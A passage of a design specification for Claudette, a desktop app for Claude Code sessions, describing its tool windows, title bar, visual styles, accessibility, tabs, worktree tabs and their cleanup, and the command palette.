- **View modes**, as Rider's: **Dock Pinned**, which every window is at first, stays until it's hidden. **Dock Unpinned** takes room the same way, but hides once the user clicks outside it (anywhere but in it or on the strip), or presses `Esc`.
- **Showing a window from elsewhere.** The composer bar's buttons (**Files**, the processes' summary, the agents' count, the tasks' progress), the command palette's **Show changed files** and the like, a reply's **Show as the plan**, starting a game, adding to the scratch pad and **Open in Find window** show their window.
- **Moving them.** Dragging an icon along the strip moves it, before the icon it's dropped at or after the last of a group, into another group too, over the line or to the foot; a line marks where it would go, and the line between the groups shows while dragging, to drop under. `Esc` cancels. **Move to** does the same from the menu. A window showing moves showing.
- **Kept.** The layout is the window's, in the app state: each window's group, place, whether it shows and its view mode, and the right side's width, the bottom's height and how the right side is shared. The side panel's width and its pages' order, saved before, carry over, and so do the edges of the layout before the strips: the right's windows go to the right-side group each starts in (Scratch pad, Processes and Games under the line, the rest to the top), the bottom's to the bottom, with their sizes.
- **The room they take.** The strip, and while a window shows at the right, the right side's least, which the sidebar gives way after, as it did after the side panel ([§4](#sidebar)); the panes keep their least beside them ([Split panes](#split-panes)).
- **Accessibility.** Every icon is a button a screen reader names by its window's title; **⋮** and **−** say whose they are (*Changed files options*, *Hide Changed files*). `Esc` hides an unpinned window.
- **How it's built.** `ViewModels/ToolWindows/`: `ToolDockViewModel` (the dock: showing and hiding, view modes, moving, the sizes, saving, the session shown and the icons' dots and tips), `ToolGroupViewModel` (a group, its icons and the window it shows), `ToolWindowViewModel` (a window) and `ToolWindowKinds` (the kinds, with the group each starts in, its icon, whether it follows the session, and when it has something to show; a feature adds its kind there). `ShellViewModel.ToolWindows.cs` chooses the session, tells tabs which windows show them and gives Games and Find their content (`FindWindowViewModel`, the searches). The views: `Views/ToolStripView` (the strip, its icons and their dragging), `Views/ToolPanelView` (a group's window with its header), `ToolWindowMenu` (a window's menu), `Views/ToolWindowView` (a window's content) and `Views/SessionPagesView` (a session window's page, which was the side panel's), placed by `ShellView` with its grips (`ShellView.ToolWindows.cs`). Tests: `ToolWindowsTests`, `ToolWindowsUiTests`, `ToolWindowScrollUiTests`.

### Window frame

✅ Built 2026-10-29. As in JetBrains Rider, the header is the window's title bar, on Windows and macOS: there's no title bar of the OS's over it.

- **What's in it.** Claudette's logo first, then **≡**, the usage meters, and at the right the account, plan and **Settings**, then the window's buttons: minimize, maximize and close on Windows, drawn by Avalonia in Windows' look, as tall as the header and side by side, so a button's highlight is too (close's red), without a full-screen button; on macOS the traffic lights at the header's left, before the logo. No title beside the logo: the logo says it, and the OS's taskbar and window lists still have the window's title, *Claudette*.
- **Moving it.** The header's gaps drag the window, and a double-click maximizes it, as a title bar's do; Windows 11's snap layouts show over maximize. Its controls take their own clicks.
- **The logo** is the window's icon on Windows: a click opens Windows' window menu (Restore, Move, Size, Minimize, Maximize, Close, the ones that apply enabled) and a double-click closes the window, as any window's icon does. A few pixels round it count too. On macOS it drags the window.
- **Its height** is the header's first row's, which the window's buttons fill; the detailed header's charts ([§6](#detailed-header)) are under the title bar, in the window.
- **The system's title bar.** Settings → Appearance → **Use the system's title bar** (off by default, this computer's) puts the OS's title bar back over the header, without the logo, and Settings over the strip of icons. Linux always has it: a window manager may not draw a window's buttons for a window that takes its title bar.
- **How it's built.** Avalonia's `ExtendClientAreaToDecorationsHint` on the main window while `MainWindowViewModel.MergesTitleBar` (the platform can, `IPlatformServices.CanMergeTitleBar`, and the setting is off). The header's controls have the `User` window-decoration role, so they take their clicks where the title bar is; the logo answers Windows' hit-test as the window's icon (`HTSYSMENU`, through `Win32Properties.NonClientHitTestResult`, whose values in Avalonia 12.1 stop short of it), and Windows does the rest; `MainWindow.FitTitleBar` sets the title bar's height to the header's first row's and keeps the header clear of the window's buttons, which aren't zoomed with it. 
- **The other windows** have title bars of their own too, the same way, with the window's buttons, in the same style and under the same setting. Every title bar is one row, 40 pixels, as the main window's header is, so the window's buttons are the same height everywhere. The diff view, the image viewer, the agent map and a tool call's window have what they show in it: the file's name and its counts, the image's name, the tab's name, the tool's icon and the call. Under it, a toolbar of its own (`Border.windowbar`, over a line) has the rest of what was the window's header: a line about what it shows (where the file is and what it's compared with, where the image came from and its size, how the call went, the agents) at its left, and what to do with it (the diff's views and actions, **Reviewed**, the image's **Copy image**, **Save as…** and zoom, **Open diff**) at its right. Settings, Usage and About Claudette have a slim bar with the window's title, over a line. With the system's title bar, the windows with a toolbar keep a row with what they show over it, and the slim bar isn't there. How it's built: `Controls/TitleBar` at the top of each window (the window's title unless `ShowsTitle` is off, what's in it, the window's buttons' room) and `Controls/WindowFrame` (whether windows draw their own, which `App` sets up with its services, and the room the window's buttons take, which the main window's header keeps clear of too); their look and the window's buttons' are `Themes/WindowFrameStyles.axaml`.

### Visual style

Settings → Appearance → **Style** picks one of two looks, in light and dark alike. It changes at once, without a restart, and syncs with the other Appearance settings.

**Scroll bars** rest as a 6-pixel line at the edge, Fluent's thumb scaled down from the bar's 16 (Fluent's own is 2), and widen to 16 under the pointer, as Fluent's do; the app sets the scale in `VerticalSmallScrollThumbScaleTransform` and its horizontal twin.

**Both styles are islands**, as JetBrains Rider's Islands theme has it (built 2026-10-28): the sidebar, each pane and the tool windows ([Tool windows](#tool-windows)) are rounded panels (10-pixel corners, their content clipped to them) with a 6-pixel gap between them, on the window's frame, which the usage header and the tool window strip sit on. Panes side by side have a gap between them rather than a line, and the lines to drag, the panes', the right side's and the bottom's, are the gaps. The frame is opaque, as Rider's is: there's no Mica backdrop.

**Standard** (the default) takes JetBrains Rider (its New UI, with the Islands theme) as its reference for the window, and Claude Code's own Visual Studio Code extension for the conversation's layout:

- **Rider's colors**, light and dark: in dark, as Rider's Islands Dark has them, a grey frame (`#26282C`) and darker islands (`#191A1C`), soft white text (`#DFE1E5`) and grey muted text (`#868A91`); in light, a light grey frame (`#EBECF0`), white islands, black text and `#6C707E` muted. The accent is Rider's blue (`#3574F0`, a lighter `#548AF7` for text and meters on dark), whatever the OS's accent: selection, meters, checked boxes, the strip's icon of a window showing. A selected row is `#2A4371` in dark and `#D5E1FF` in light, and the sidebar's selected tab Rider's quieter grey.
- **Rider's type**: Inter for the interface and JetBrains Mono (its NL cut, without ligatures) for code, paths and commands, both of which Claudette ships, so it reads the same on every OS. A conversation or code font set in Settings wins.
- **The conversation is cards** ([§18](#conversation-cards)): each step has a stripe down its left edge in its kind's color, over a faint tint of it, and a header line with the kind, its time and, on hover, its buttons. Your messages are magenta, Claude's replies blue and the files a turn changed green; tool calls, thinking, subagents and notes are neutral, and a turn's statistics slate.
- Tool calls in a row share one card, as tiles side by side, each with a small status dot (running, done, failed), what it worked on, how it went and its output's first line. A tile's target is cut to fit, a file by the end of its path; hovering it shows it in full (a whole command, with its line breaks, or a file's whole path), in a tip up to 760 pixels wide, wider than a tip of words, so a long command wraps less. A click opens its detail under the tiles.
- Diffs are inline, in red and green.
- Thinking is a quiet card whose line opens it. Collapsed, its text isn't laid out at all; expanded while it streams in, it grows in steps (each an eighth longer) rather than with every piece, and shows all of it once it's done.
- The composer is a rounded box with the mode and model controls beside it. Send and Stop are round buttons, as in the Claude style: an arrow in the accent color, and a square in the plain button's colors.
- Inline code and code blocks use VS Code's Light+ and Dark+ colors. They change with the theme, as the diff view's do, including in code already shown and in a diff view that's open.

**Claude** takes the Claude apps (the iOS app and claude.ai) as its reference. The layout, the islands, tool rows, diffs and every control stay the same; the look changes:

- **Colors**, from the Claude apps' scale:
  - Light: ivory islands (`#FAF9F5`) on a warmer frame (`#F0EEE6`), white cards and composer, near-black text (`#141413`) and warm grey muted text (`#73726C`).
  - Dark: charcoal islands (`#262624`) on a darker frame (`#1F1E1D`), lighter cards and composer (`#30302E`), off-white text (`#FAF9F5`) and warm grey muted text.
  - The accent is Claude's orange (`#D97757`), with a darker orange for accent text on light and a lighter one on dark, so it stays readable. The working line's glyph and verb are orange, like the Claude apps' spark.
  - Cautions (a waiting prompt, a usage alert, "Needs your input") are warm tints of the accent rather than yellow. Errors, diffs, the charts' model lines and a tab group's own color keep their usual colors.
- **The cards take the Claude apps' colors**: your messages warm grey, as the Claude apps' bubbles are, Claude's replies its orange, and the files a turn changed blue, which stays apart from the orange with color blindness ([§18](#conversation-cards)).
- **Its own type**: the OS's interface font, and **Claude's replies set in a serif**, as the Claude apps set them. Their typeface isn't available, so it's the closest installed one: Charter on macOS, Georgia or Cambria on Windows, and Charter, Noto Serif or DejaVu Serif on Linux. A conversation font set in Settings wins.
- **The composer** is a big rounded box lifted a little off the page. Send and Stop are the same round buttons as in Standard, with Send in Claude's orange.
- **Rounder corners** on the cards, code blocks and the sidebar's rows.

How it's built: `App.axaml` holds Standard's tokens, Rider's colors (`FrameBrush` and `IslandBrush` among them, and `Border.island`'s style), and `Themes/ClaudeColors.axaml` the Claude values of Claudette's own tokens (the cards' among them); `Themes/AppColors` swaps them in and gives Fluent a matching palette, Rider's or the Claude apps' (the window background, text, controls, and the accent it derives its shades from). Fluent reads most palette colors only when its resources are first used, so applying a style, the first at launch too, loads a fresh Fluent theme with the palette already set. The fonts are resources App sets for the style: `UiFont` (every window and popup takes it), `ReplyFont`, `ConversationFont` and `MonoFont`; JetBrains Mono is in `Assets/Fonts`, and Inter comes with `Avalonia.Fonts.Inter`. The shapes are styles under the `claude` class, which the main view takes, as Density's are under `compact`. Code blocks take their syntax colors through `Views/CodeBlockTheme` rather than LiveMarkdown's own property, because LiveMarkdown re-highlights a block already shown by setting its code again, which empties a one-line block.

In both styles, text in a different font or size beside other text sits on its baseline: a changed file's status letter and counts beside its name ([§8](#8-file-changes--diff-view)), a tool row's summary and counts beside the tool's name, the autocomplete's hints and descriptions beside their titles. Lining them up by their tops or centres only looks right when the fonts agree, which they don't from one OS to the next or at another code font size (Settings → Appearance). `Controls/Baseline` puts one text block's first baseline on another's after each layout pass, on whole screen pixels, with a render transform, so the row's layout doesn't change.

### Accessibility

- **Names.** Every control has a name a screen reader can say: a text button its text, and an icon-only button an `AutomationProperties.Name` ([CLAUDE.md](CLAUDE.md)).
- **Announcements.** What a notification would say is also read out by a screen reader, whether or not the notification is shown: a prompt that waits (*"work: Allow this command? npm test"*), a turn that finished (*"work: Claude finished."*) and an error. They go to a live region on the main window (`AutomationProperties.LiveSetting` polite), which no one sees, so they never interrupt what's being read.
- **Reduce motion.** ✅ Built 2026-10-01. Settings → Appearance → **Motion**: *Follow the system* (the default), *Reduce motion* or *Don't reduce*. Reduced, the busy dots stop pulsing, the working line's glyph stays still (its words still change), the taskbar or Dock icon shows its animation's first frame instead of moving, so it still says what the tabs are doing, and Claudette on the composer stands still in the first pose of what she'd be doing ([§5](#claudette-on-the-composer)). Following the system, motion is reduced when the OS asks for it (Windows' *Show animations in Windows*, macOS's *Reduce motion*, GNOME's `enable-animations`) or when Claude Code's own `prefersReducedMotion` setting does, in its user `settings.json`, so a choice made for the terminal holds here too. They're read at launch, once Claude Code's config folder is known, and when the window comes back to the front (at most once a minute). How it's built: every window takes the `reducemotion` class while motion is reduced, and the pulse is a style that applies only outside it (`SystemMotion` in Claudette.Platform (`Accessibility/`) reads the OS's setting, behind Core's `ISystemMotion`).
- **Zoom.** ✅ Built 2026-10-01. `Ctrl/Cmd +` and `Ctrl/Cmd −` scale everything in the main window in steps from 80% to 200%, and `Ctrl/Cmd+0` goes back to 100% (rebindable, [§14](#keyboard-shortcuts); the number pad's keys work too). Settings → Appearance → **Zoom** sets the same, and the command palette has *Zoom in*, *Zoom out* and *Reset zoom*. Each change is announced (*"Zoom 125%"*). It suits each machine's screen, so it doesn't sync. Popups, menus and tooltips, and the other windows, keep their size.

## 4. Tabs & Sessions

- A tab is one Claude Code session, run as its own `claude` process.
- Every tab has a **working folder**, picked when the tab is opened, usually from the recent folders list ([Opening a tab](#opening-a-tab)). Several tabs can use the same folder.
- **Naming**
  - By default a tab uses the AI-generated title Claude Code gives the session, the same kind of name it shows as the terminal tab title. In headless mode Claudette has to ask for it after the first prompt (see [session naming](#integration-with-claude-code)).
  - Until Claude Code has named it, the tab shows the folder name.
  - The user can rename a tab (double-click, or right-click → Rename). A user-chosen name is never overwritten by Claude Code. "Reset name" goes back to the automatic name.
- **Status icon** on each tab:
  - Idle
  - Working (animated)
  - Needs input: a permission prompt or question is waiting (highlighted, so it stands out from any tab)
  - Finished while in the background (unread dot)
  - Error or process exited. The tab's row and info card say what went wrong: the last line Claude Code wrote to its error output, or why it couldn't start.
  - **Why it couldn't start.** Every `claude` starts with `CLAUDE_CODE_STARTUP_FAILURE_RESULTS=1`, so a start Claude Code refuses ends with a result that says why (`startup_failure_reason`, with its error text), not only a line of error output. The tab puts each reason in words with what to do: an organization's settings that don't allow the sign-in or provider, or that it requires and that couldn't be loaded or were refused, a proxy setting that isn't a URL, Git for Windows missing, a Claude Code too old to run, Bypass mode while running as root, a conversation held by a background session, and so on, followed by what Claude Code said. A folder Claude Code can't use offers **Choose folder…**, as a missing folder does ([§9](#restore-on-launch)). A reason Claudette doesn't know shows Claude Code's own text.
- **Model and effort** are easy to see for every tab. The second line of the tab's row shows them (for example `Opus · High`), and the composer bar shows the same thing in full for the selected tab. See [Model & effort](#model--effort).
- **Tab info card.** Hovering a tab shows a card with the tab's details. It's the one place features add per-tab information, rather than putting it in the tab name. It shows:
  - The full folder path and git branch.
  - Model and effort, and the permission **Mode**.
  - When the session started (for a resumed session, its transcript's first entry; saved with the tab), tokens used and context %.
  - **Session**, the session's ID (what `claude --resume` takes), and **Reached as**, the name other Claude Code sessions message it by ([§13](#integration-with-claude-code), "Session naming"). Usually the tab's name; a variant of it when another session already had that name, or the one Claude Code made from the folder (`claudette-3f`) with naming turned off. In the **ⓘ** card each has **Copy**, and the tab's menu has **Copy session ID** once there is one. Pasted into another tab's message, the ID reaches this session too: Claudette tells Claude the name to message it by ([§5](#autocomplete), "Sessions and agents").
  - **Sync size**, while the tab syncs and once its session is in the session library: what it takes there, *312 MB in the session library* ([§9](#session-library-sync-across-machines), "Writing").
  - Later features add rows here: the Perforce login and changelist ([§18](#perforce-ticket-handling)), the **Project** the tab's folder holds and whether Claude was told about it ([§18](#project-tools)), and the **Claude app** connection: connected at the session's address, connecting, or why not ([§18](#remote-control-the-claude-app)), for example.
  - **Agents**, while the tab has subagents: how many are running or waiting on you, or how they ended ([§18](#agent-map)).
  - **Running tasks**, while Claude Code has work going in the background: one line each, such as *Shell command: Start the dev server*, up to four and then *and 2 more* ([§5](#running-tasks)).
  - **Tasks**, while Claude keeps a task list: how many are done and the one in progress, *3 of 7 done · Now: Running the tests* ([§5](#tasks)).
  - **Usage limit**, while a usage limit has stopped the tab's task: when it resets, and whether the task continues then ([§6](#continuing-after-a-limit-resets)).
  - **Claude Code**, the version the tab's `claude` is running, and when a newer one is installed, that it is and that new tabs use it ([§12](#applying-it)).
  - **Status**, last: what the status icon's tip says.
  - The same card opens from the **ⓘ** button last on the status line under the composer, for the selected tab.
- **Token stats per tab.** Each tab keeps a running count of the tokens it has used:
  - Input, output, cache write and cache read tokens, split by model when the session used more than one.
  - Two time spans: **this session window** (since the current 5-hour window started, which is the part that counts against the session limit) and **all time** for this tab's session.
  - An estimated cost, labeled as an estimate (Claude Code computes it at list price; it is not your bill).
  - Each turn adds what it spent, worked out from Claude Code's running totals ([§6](#data-source)), so a long session isn't counted again with every turn.
  - Shown in short form in the composer bar (for example `1.2M tok`). Click it for a popover with the full breakdown and a small per-turn chart. The window's tokens and the chart come from the usage history, read once (a week's turns for the tab, by its index) when the popover opens and again as the tab's turns are recorded while it's open; other tabs' turns don't touch it.
  - Saved with the tab, so the counts survive app restarts and session resumes.
  - The same numbers feed the "which tab is burning the most" view in the Usage panel ([§6](#6-token-burn-awareness)).
- **Grouped by folder.** Tabs that share a working folder sit together in a group, like browser tab groups. In the sidebar a group is a label with its tabs listed under it:
  - Each group has a label with the folder name and a color. A line in the color runs down beside its tabs. If two folders have the same name, the label adds the parent folder (`work/api`, `personal/api`).
  - **The color.** ✅ Built 2026-09-29. A new group takes the first of eight group colors that no open group has. **Change color…** in the group's menu, in the full sidebar or the rail, opens a color picker beside the label:
    - The eight group colors as swatches, each named in its tip, with the group's own ringed. Clicking one applies it and closes the picker.
    - For any other color, a saturation and brightness square, a hue slider, and a hex field (`#12AB34`, or `#1A3`). The group changes color as you drag or type, and the hex field applies once it holds a whole color; Enter closes the picker.
    - The color is remembered for the folder on this machine (in `state.json`), so the group has it again after a restart, or when the folder is opened again after its group was closed, however its path was written.
  - **The name.** ✅ Built 2026-10-14. **Rename…** in the group's menu, in the full sidebar or the rail, opens a small box beside the label, for folders with the same name in different places. It starts with the label selected, with the folder's path under it, and **Rename** or Enter saves it; **Cancel**, Escape or a click outside leaves the label as it was.
    - The label shows the name in place of the folder's. A named group doesn't count as a clash, so another folder of the same name keeps its plain name (`api` beside *Side project*).
    - Saving it empty, or as the folder's own label, goes back to the folder's name, as does **Reset name**, in the menu while the group has a name.
    - The name is remembered for the folder on this machine (in `state.json`), as the color is.
  - Hovering the label shows how many tabs the group has and its full path (*"3 tabs in D:\Work\api"*). The group's `+` opens a new tab in the same folder. The **Project files** button before it opens the project's editor ([§18](#project-files)), and before that the project's icon opens its menu of actions and links ([§18](#project-tools)).
  - A group can be collapsed to just its label. A collapsed group still shows the most urgent status of its tabs, such as "needs input".
  - Tabs can be dragged to reorder them within their group, and groups can be dragged (by their label) to reorder them. A tab can't be dragged into another group, because its folder is fixed, and pinned tabs stay ahead of the others.
    - A dragged tab's row is marked as a selected one is, and the list rearranges as soon as the pointer passes the middle of a neighbor. Dropped in the sidebar, the tab is selected, as a click would. **Move up** and **Move down** in the tab menu do the same from the keyboard or mouse.
    - Dragged out onto the conversation, the tab opens beside a pane instead ([§18](#split-panes)). It isn't selected as the drag starts, which would put it in the focused pane before it's anywhere.
  - A group with a single tab still gets a label, so the sidebar always looks the same.
- Closing a tab that is working asks for confirmation, then stops the process. Right-clicking a group label gives **New tab here**, **New tab in a worktree** (for a folder in a git repository, [below](#worktree-tabs)), **History for this folder** (History listing only that folder's sessions, [§9](#history)), **Open project files** ([§18](#project-files)), **Collapse group** (or **Expand group**), **Rename…** (and **Reset name**), **Change color…**, **Account ▸** (once there's an account besides Default, [below](#accounts)) and **Close group**.
- **Pinned tabs** come back every time Claudette launches, resuming their sessions.
  - Pin or unpin from the tab's right-click menu, whose tip sums up what pinning does (the points below). A pinned tab shows a pin icon and sits at the start of its folder group.
  - **Close group** and **Close other tabs** skip pinned tabs.
  - Closing a pinned tab asks *Close "name"?*, saying *"This tab is pinned; closing it also unpins it."*, with **Close**.
  - Unpinned tabs are restored only while **Also restore unpinned tabs when Claudette starts** is on in Settings, as it is by default. See [§9](#restore-on-launch) for what's restored.
- **Marks.** ✅ Built 2026-10-07. A tab can carry a small icon of the user's own, meaning whatever they want it to; Claudette gives it no meaning. **Mark** in the tab's menu, in the full sidebar and the rail, offers a check (✓), a cross (✕), a question mark, a star, a flag and a pause sign.
  - The row shows it under the status icon, level with the second line ([Sidebar](#sidebar)), each in its own color: a green check, a red cross, an amber question mark, a gold star, the flag in the accent color and a muted pause sign. Its tip only names it (*"Marked with a question mark"*). Each is a vector icon (`Views/MarkIcon`), so it looks the same on every platform and never turns into an emoji.
  - The menu ticks the tab's mark, and picking it again takes it off. **Clear mark**, in the menu while the tab has one, does the same.
  - It belongs to the session: it's saved with the tab, kept for the session on this machine, and written into the session library's record for a tab that syncs, 2 seconds after it changes, as reviewed ticks are ([§9](#session-library-sync-across-machines)). History shows it before the session's title, and opening the session brings it back.
    - This machine keeps each session's mark with when it was set (`sessionMarks` in `state.json`, by session id), once the session has an id of its own; a cleared one is kept as cleared.
    - A session in both goes by whichever was written last, the record or this machine's (`TabMarks.ForSession`). The record carries every machine's latest, but a tab that stopped syncing never writes it again, so a mark set or cleared here since wins over it.
  - A copy (**Duplicate tab**, **Branch from here**, **Open a copy**) starts without it, as it does without the tab's name, and marking one before its first turn doesn't mark the original's session. After `/clear` the tab keeps its mark, and its new session has it too.
  - It's stored as a word (`"question"`), so a mark a later Claudette adds reads as none rather than failing the whole file, and stays as written.
  - **Reviewed.** ✅ Built 2026-10-07. While every file Claude changed in the session is ticked as reviewed ([§8](#8-file-changes--diff-view), "Reviewed"), the row shows a reviewed icon in the mark's place, over whatever mark the tab has: a green disc with a check cut out of it, so it isn't taken for the check mark. Its tip says so, with the mark it covers: *"All changed files reviewed · Marked with a star"*.
    - It isn't a mark: it isn't in the menu, and the tab's own mark stays as it is, showing again as soon as a file isn't reviewed, when Claude changes one or you untick one. **Mark** and **Clear mark** still change the mark underneath.
    - It comes from the ticks, which are saved and synced, so the session opened on another machine shows it again. It follows Claude's changes in a tab in the background too, without waiting for the tab to be shown.
    - A restored tab doesn't read its conversation back until it's first shown ([§9](#restore-on-launch)), so whether it shows the icon is saved with the tab (`allFilesReviewed`), and the row has it from launch. Once the tab has read its conversation, or found it gone, it's worked out from the changes and ticks again. A copy of the tab keeps it, as it keeps the ticks.
    - The rail shows it in the mark's corner. History shows only the mark.
- **Syncing.** **Sync to other machines** in the tab's right-click menu (a check item), or in its **Tab settings…**, turns copying the tab's session to the session library on or off ([§9](#session-library-sync-across-machines)). It's off for a new tab unless Settings → Sessions says otherwise. A tab that syncs shows a small sync icon in its row, and **Sync now** in its menu, which copies the session to the library straight away instead of after the next turn. What the session takes in the library shows in the icon's tip, the info card and **Tab settings…**, under **Sync to other machines**: *This session takes 312 MB in the session library.*
- **The Claude app.** **Connect to the Claude app** in the tab's right-click menu (a check item), or in its **Tab settings…**, connects the tab to the Claude app with Remote Control whenever its session runs ([§18](#remote-control-the-claude-app)). It's off for a new tab unless Settings → Claude Code says otherwise. A connected tab shows a small phone icon in its row, and **Open in the Claude app** in its menu.
- **Extra folders.** ✅ Built 2026-10-01. **Tab settings…** lists folders Claude may read and edit besides the tab's own, with **Add folder…** and a remove button on each. Claude Code takes them as `--add-dir`, one each; their own `.claude` settings and `CLAUDE.md` aren't loaded. They're saved with the tab and copied with it. Claude Code takes them when it starts, so changing them starts it again at once, carrying the conversation on, or, when Claude is working, once it has nothing left to do: the turn under way and any messages sent meanwhile ([Queued messages](#queued-messages)) run first. A note says so. A start for any other reason takes them too, and no restart follows. A folder that's gone isn't passed. The tab info card lists them.
- Keyboard: `Ctrl/Cmd+T` new tab, `Ctrl/Cmd+W` close, `Ctrl+Tab` / `Ctrl+Shift+Tab` cycle, `Ctrl/Cmd+1…9` jump to a tab, `Ctrl/Cmd+B` collapse or expand the sidebar, `Ctrl/Cmd+J` go to the next tab waiting for you (a permission prompt, a question or a plan, in sidebar order after the selected tab, going round), `Ctrl/Cmd+Shift+P` the [command palette](#command-palette).

### Worktree tabs

✅ Built 2026-10-01. Several tabs in one folder edit the same files, so one tab's changes can trip another's. A tab can work in a git worktree of its own instead: a second checkout of the repository, on its own branch, where its edits don't meet the others' ([Claude Code: worktrees](https://code.claude.com/docs/en/worktrees)).

- **Opening one.** **New tab in a worktree**, in a group's menu (for a folder in a git repository) or the command palette, opens a tab in that folder whose Claude Code starts with `--worktree <name>`. Claude Code makes the worktree at `.claude/worktrees/<name>` in the repository, on the branch `worktree-<name>`. Claudette picks the name, two words such as `brisk-otter`, that no folder there, other tab or leftover `worktree-<name>` branch has, so a restart before the first turn opens the same worktree rather than another. A folder outside a git repository says it can't have one.
- **Working there.** The first turn's `system/init` names the worktree as where Claude Code works. From then on the tab's folder is the worktree: changed files and the git view, `@` files, project tools and the info card follow, a note says *"Working in the worktree brisk-otter, on its own branch"*, and later starts resume the session in it. Claude Code keeps its transcript under the worktree's folder; History lists it under the repository's, naming the worktree ([§9](#history)).
- **Claude moving between worktrees.** ✅ Built 2026-10-24. Claude can move a session into a worktree mid-session with `EnterWorktree`, and back out with `ExitWorktree`. The result names the worktree (`worktreePath`, `worktreeBranch`), or the folder the session went back to (`restoredCwd`, else `originalCwd`), and the next turn's `system/init` names the same `cwd` (checked with 2.1.302 and 2.1.308; 2.1.308 has Claude load the tools with ToolSearch first).
  - The tab follows, as a worktree tab does into the worktree Claude Code makes: its folder is the worktree from then on, and it stays in its group. A note says *"Working in the worktree brisk-otter, on its own branch"*, or *"Out of the worktree, back in D:\Projects\Game."*
  - A turn's `cwd` is followed too, such as for a session resumed in a worktree it moved into, but only to the top of another working tree of the same repository, or back to the group's folder; a `cd` into a subfolder isn't.
  - Only the session's own calls count, not a subagent's.
- **In the sidebar** it stays in the main checkout's group. Its row's branch badge shows the worktree's name with a branch icon, its tip naming the worktree and its branch ([Sidebar](#sidebar)); with the badge turned off, the branch icon is on the name line instead. The info card has a *Worktree* row. **Duplicate tab** and **Branch from here** copy it into the same worktree. A session opened from History whose folder is a worktree Claude Code made (`<checkout>/.claude/worktrees/<name>`) goes back in its checkout's group too.
- **Removing it.** Claude Code leaves `-p` worktrees behind, locked, so closing the last tab in a worktree asks what to do with it, once the tab's Claude Code has stopped:
  - *Nothing of its own* (no changes, no commits on any other branch): **Remove the worktree brisk-otter?** with **Remove** and **Keep**. It says *nothing is lost* only when nothing git ignores is there either; otherwise it says such files (build output, a local `.env`) go with it.
  - *With work in it*: **Keep the worktree brisk-otter?**, saying what it holds (*uncommitted changes and 2 commits on no other branch*), with **Keep** and **Remove and discard**.
  - Removing looks again first: if what it holds changed while the question waited (a commit made from a terminal, say), it asks again rather than removing. Then it unlocks it, runs `git worktree remove` (with `--force` when discarding; it may take minutes for a big tree), and deletes the `worktree-<name>` branch when it has no commits of its own or they're discarded too. Git's refusal is shown as it said it, and a worktree git didn't remove is locked again.
  - **Close group** and **Close other tabs** offer the worktrees they leave with nothing of their own together, and keep the rest. A worktree another open tab still works in, or will (a copy made before the first turn), isn't asked about, however the tabs spell its path: Claude Code reports a worktree tab's folder by its real path, so paths are matched with their symbolic links followed, as cleanup matches them (below). Nor is one whose tab was closed with **Close, leave running**: what was left running may be working there. A kept worktree stays with its session in History.
- **Setting it up.** The folder's actions marked to run in each new worktree run there once Claude Code has made it, such as installing dependencies ([§18](#project-tools), "Setting up a new worktree").

#### Cleaning up worktrees

✅ Built 2026-10-02. Kept worktrees pile up. Settings → Git → **Worktrees** can remove them on their own; both rules are off by default.

- **Remove worktrees once everything in them is merged.** A worktree with nothing of its own (no uncommitted changes, and every commit on another branch, local or remote) goes with its branch, as **Remove** would, a day after a tab last used it. The day means one closed with **Keep** a moment ago isn't taken at once.
- **Remove worktrees no tab has used for** *Never* (the default), 7, 14, 30 or 90 days. The worktree goes, and its `worktree-<name>` branch stays when it has commits on no other branch, so nothing committed is lost and a new worktree tab, or a terminal, can carry on from it.
- **Never removed:** a worktree an open tab works in or will (one waiting to be made with `--worktree`), one an open tab's session changed files in ([§8](#working-trees)), one with uncommitted changes or untracked files, one whose work git couldn't count, and any worktree Claude Code didn't make for a worktree tab (only those at `<checkout>/.claude/worktrees/<name>` are looked at). Files git ignores there, such as build output or a copied `.env`, go with a removed worktree, as the setting says. Its session stays in History; opening it finds its folder gone ([§9](#restore-on-launch), "Missing folder").
- **When a tab last used one.** State keeps the time for each worktree (`worktreesLastUsed` in `state.json`): an open tab's worktree is marked at each pass, and a closed tab's as it closes. A worktree first met with no time, such as one made before this setting existed or from a terminal, counts from when Claudette first saw it.
- **When it looks.** A minute after launch, then every hour, on the injected clock, while either rule is on. It looks in the repositories of the open tabs, the recent and favorite folders, and the worktrees it has times for: `git worktree list`, then what each holds as the close question reads it ([above](#worktree-tabs)), then `git worktree remove` without `--force`, so git itself refuses to remove changes. Just before removing, it checks again that no tab has opened there.
- **What it did.** Settings says what the last pass removed and when (*"Last removed brisk-otter and calm-heron, 2 h ago."*), with **Clean up now** for a pass straight away. Each removal is logged.
- How it's built: Core's `Git/WorktreeCleanup` decides, from what git says, the time and the rules; the app's `Services/WorktreeCleanupService` finds the worktrees, keeps the times and removes them through `GitWorktrees`. Git lists a worktree by its real path and a tab names it as it was opened (on macOS, a folder under `/var` is really under `/private/var`), so the service matches paths with their symbolic links followed (Core's `Files/RealPath`). `WorktreeCleanupTests` (Core) and `WorktreeCleanupServiceTests` (the app, against real git repositories in temporary folders).

### Command palette

`Ctrl/Cmd+Shift+P` opens a box over the window that does anything Claudette has a command for, by typing a few letters of it.

- **What it lists**, in this order before anything is typed:
  - **Commands**: **New tab**, **Open from History…**, Settings, collapsing the sidebar, zooming in and out (and back to 100% when zoomed, [§3](#accessibility)), going to the next tab waiting (when one is); and for the selected tab, find, the conversation's first message and its latest, closing panes (with tabs side by side) and showing a thread with its sub-threads ([§18](#split-panes)), **Stop Claude** (while Claude works), the project's main action, **Stash the message** (while something's typed, [§5](#drafts-and-the-stash)), showing each tool window ([Tool windows](#tool-windows)), **Tab settings…**, **Duplicate tab**, **New tab in a worktree** (for a folder in a git repository, [Worktree tabs](#worktree-tabs)), restarting Claude Code (when it stopped) and closing the tab. **Go to file…** and **Open project files** open the project's Files tab; while it has the focus, the palette has its own commands instead: saving the file and all files, closing the file, going to a line, showing only changed files, hiding the explorer and closing the Files tab ([§18](#project-files)). Each shows its shortcut, so the palette teaches them.
  - **Tabs**, by name with their folder: picking one selects it.
  - **Folders**: favorites, then recent folders. Picking one opens a new tab there.
  - **Settings** categories: picking one opens Settings there.
  - **Help**: **User Guide**, **Ask on Discord** and **Report an issue**, as at the foot of Settings' sidebar ([Version](#version)). **About Claudette** follows them, opening its window ([About](#about)).
- **Filtering.** An entry matches when the typed letters appear in its name in order, ignoring case; a match at the start of the name or of a word, or with the letters together, comes first. An entry also matches by its kind (shown beside it: *Command*, *Tab*, *Folder*, *Settings* or *Help*), lower down.
- `Up` and `Down` choose, `Enter` runs the choice (as does a double click), `Esc`, a click outside or the shortcut again closes it. While it's open, the window's other shortcuts are left to it.

### Sidebar

